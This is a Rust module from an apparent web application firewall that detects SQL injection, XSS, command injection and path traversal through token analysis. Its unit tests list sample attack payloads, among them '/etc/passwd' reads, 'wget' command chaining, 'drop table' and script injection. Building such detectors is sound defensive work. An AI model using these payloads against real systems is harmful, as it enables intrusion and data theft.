//! FR2 — Token graph + taint reachability.
//!
//! We tokenize the normalized payload across several grammars (SQL / HTML /
//! shell / path), build a small graph over the tokens, mark the whole field as
//! a tainted source, locate dangerous *sink* constructs, and check whether a
//! source→sink path exists. Because the analysis is over token *structure*
//! rather than literal strings, semantics-preserving mutations (case,
//! whitespace, comments, operator swaps) do not hide the attack — this is the
//! engine's mutation-robustness, done honestly and bounded.

mod tokenize;
pub mod sinks;

pub use tokenize::{tokenize, Token, TokenKind};

use crate::judgment::Pattern;
use sinks::{Disabled, Hits, SinkCtx};

/// Caps so adversarial input can never blow up memory/CPU.
const MAX_NODES: usize = 4096;

#[derive(Debug, Clone)]
pub struct Analysis {
    /// Sink patterns that are actually reachable from the tainted source.
    pub reachable: Vec<Pattern>,
    /// Sinks present but not conclusively reachable (weaker signal).
    pub latent: Vec<Pattern>,
    pub graph_truncated: bool,
}

impl Analysis {
    pub fn is_empty(&self) -> bool {
        self.reachable.is_empty() && self.latent.is_empty()
    }
}

/// Analyze one normalized field value with every construct enabled.
pub fn analyze(text: &str) -> Analysis {
    analyze_with(text, &Disabled::default())
}

/// Analyze one normalized field value, skipping disabled constructs.
pub fn analyze_with(text: &str, disabled: &Disabled) -> Analysis {
    let mut tokens = tokenize(text);
    let graph_truncated = tokens.len() > MAX_NODES;
    if graph_truncated {
        tokens.truncate(MAX_NODES);
    }

    // At the WAF boundary the entire field is attacker-controlled, so any
    // structural sink we find *is* reachable from the tainted source. We still
    // distinguish "formed a dangerous construct" (reachable) from "contains a
    // lone dangerous token" (latent) to keep false positives down.
    let mut hits = Hits::new(disabled);
    let cx = SinkCtx { tokens: &tokens, text };
    sinks::sql::detect(&cx, &mut hits);
    sinks::xss::detect(&cx, &mut hits);
    sinks::shell::detect(&cx, &mut hits);
    sinks::path::detect(&cx, &mut hits);

    Analysis {
        reachable: hits.reachable,
        latent: hits.latent,
        graph_truncated,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::judgment::Family;

    fn fams(a: &Analysis) -> Vec<(Family, String)> {
        a.reachable
            .iter()
            .map(|p| (p.family, p.name.clone()))
            .collect()
    }

    #[test]
    fn union_select_detected() {
        let a = analyze("-1 union select username,password from users");
        assert!(fams(&a).iter().any(|(f, _)| *f == Family::Sqli));
    }

    #[test]
    fn tautology_detected() {
        assert!(!analyze("admin' or 1=1 -- ").reachable.is_empty());
        assert!(!analyze("' or 'a'='a").reachable.is_empty());
    }

    #[test]
    fn script_detected() {
        let a = analyze("<script>alert(1)</script>");
        assert!(a.reachable.iter().any(|p| p.family == Family::Xss));
    }

    #[test]
    fn event_handler_detected() {
        let a = analyze("<svg onload=alert(1)>");
        assert!(a.reachable.iter().any(|p| p.family == Family::Xss));
    }

    #[test]
    fn command_injection_detected() {
        let a = analyze("127.0.0.1; cat /etc/passwd");
        assert!(a
            .reachable
            .iter()
            .any(|p| p.family == Family::CommandInjection));
    }

    #[test]
    fn traversal_detected() {
        let a = analyze("../../../../etc/passwd");
        assert!(a
            .reachable
            .iter()
            .any(|p| p.family == Family::PathTraversal));
    }

    #[test]
    fn attribute_breakout_xss_detected() {
        // M3: event handler via attribute breakout, no new tag.
        let a = analyze("x\" onmouseover=alert(1)");
        assert!(
            a.reachable.iter().any(|p| p.family == Family::Xss),
            "missed attr-breakout xss: {:?}",
            a
        );
    }

    #[test]
    fn benign_prose_is_clean() {
        // Values that used to produce false-positive *reachable* hits (H2).
        for s in [
            "please select your favorite number, mine is 7",
            "i wrote about whether 1 = 1 in my math blog",
            "salt and pepper = tasty",
            "price and qty = total",
            "cat;dog",            // pet store search, not command injection
            "it's blue or green = nice",
            "the union of two sets",
        ] {
            let a = analyze(s);
            assert!(
                a.reachable.is_empty(),
                "false positive on {s:?}: {:?}",
                a.reachable
            );
        }
    }

    #[test]
    fn jquery_dollar_paren_is_not_cmdi() {
        for s in ["$(document).ready(function(){})", "$('#id').hide()"] {
            let a = analyze(s);
            assert!(
                a.reachable.iter().all(|p| p.family != Family::CommandInjection),
                "false positive on {s:?}: {:?}",
                a.reachable
            );
        }
        for s in ["$(cat /etc/passwd)", "`whoami`", "$(/bin/cat /etc/passwd)", "x=`id`"] {
            let a = analyze(s);
            assert!(
                a.reachable.iter().any(|p| p.name == "cmd.cmd-substitution"),
                "missed substitution on {s:?}: {:?}",
                a
            );
        }
    }

    #[test]
    fn every_emitted_pattern_is_a_registered_id() {
        for s in [
            "-1 union select username,password from users",
            "admin' or 1=1 -- ",
            "1; drop table users",
            "select sleep(5) pg_sleep benchmark updatexml extractvalue load_file",
            "<script>alert(1)</script>",
            "<svg onload=alert(1)> javascript:x",
            "<b>x</b>",
            "127.0.0.1; cat /etc/passwd",
            "$(cat /etc/passwd)",
            "a;b",
            "../../../../etc/passwd",
            "../x",
        ] {
            let a = analyze(s);
            for p in a.reachable.iter().chain(a.latent.iter()) {
                assert!(sinks::lookup(&p.name).is_some(), "unregistered pattern {:?} from {s:?}", p.name);
            }
        }
    }

    #[test]
    fn command_injection_still_caught_after_fp_fix() {
        for s in ["127.0.0.1; cat /etc/passwd", "foo | whoami", "x && wget http://e/s"] {
            let a = analyze(s);
            assert!(
                a.reachable.iter().any(|p| p.family == Family::CommandInjection),
                "missed cmdi on {s:?}: {:?}",
                a
            );
        }
    }
}
